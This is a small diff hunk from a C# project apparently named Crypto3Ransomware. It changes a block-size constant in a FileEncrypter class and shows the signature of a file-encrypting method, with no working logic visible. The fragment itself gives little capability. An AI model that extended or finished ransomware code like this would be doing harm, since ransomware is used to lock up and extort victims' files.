@@ -7,7 +7,7 @@ namespace Crypto3Ransomware;
 public static class FileEncrypter
 {
     private const int Offset = 0;
-    private const int BlocSize = 256;
+    private const int BlocSize = 128;
     
     public static void EncryptAndWriteToPath(string fileToEncryptPath, string pathToWriteEncryptedFile)
     {
